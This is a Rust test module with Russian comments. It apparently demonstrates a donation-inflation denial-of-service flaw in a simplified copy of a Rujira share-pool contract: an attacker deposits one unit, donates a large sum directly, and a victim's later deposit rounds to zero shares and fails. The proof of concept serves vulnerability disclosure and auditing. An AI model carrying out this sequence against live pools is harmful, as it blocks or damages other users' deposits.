#[cfg(test)]
mod tests {
    // Упрощенная логика из оригинального контракта для демонстрации
    struct SharePool {
        size: u128,
        shares: u128,
    }

    impl SharePool {
        fn new() -> Self {
            Self { size: 0, shares: 0 }
        }

        // Логика join из оригинального кода Rujira
        fn join(&mut self, amount: u128) -> Result<u128, String> {
            if amount == 0 { return Err("Zero Amount".to_string()); }

            if self.shares == 0 {
                self.size += amount;
                self.shares += amount; // 1:1 initial ratio
                return Ok(amount);
            }

            // Формула: issuance = (shares * amount) / size
            // В Rust деление целых чисел всегда округляется вниз (floor)
            let issuance = (self.shares as u128 * amount) / self.size;
            
            if issuance == 0 {
                return Err("SharePoolError: Zero Shares (DoS)".to_string());
            }

            self.shares += issuance;
            self.size += amount;
            Ok(issuance)
        }

        // Имитация прямого доната (Inflation)
        fn donate(&mut self, amount: u128) {
            self.size += amount;
        }
    }

    #[test]
    fn test_inflation_dos_attack() {
        let mut pool = SharePool::new();

        // 1. Атакующий заходит первым с минимальной суммой
        let attacker_deposit = 1;
        pool.join(attacker_deposit).unwrap();
        println!("Step 1: Attacker joined with 1 unit. Pool size: {}, Shares: {}", pool.size, pool.shares);

        // 2. Атакующий раздувает пул (Inflation via donation)
        // Представим, что он закинул 1,000,000 токенов напрямую
        let donation = 1_000_000;
        pool.donate(donation);
        println!("Step 2: Attacker donated {}. Pool size: {}, Shares: {}", donation, pool.size, pool.shares);

        // 3. Обычный пользователь пытается внести 100 токенов
        let victim_deposit = 100;
        let result = pool.join(victim_deposit);

        // Проверяем, что транзакция падает (DoS)
        assert!(result.is_err());
        println!("Step 3: Victim tried to deposit {}. Result: {:?}", victim_deposit, result.err().unwrap());
    }
}
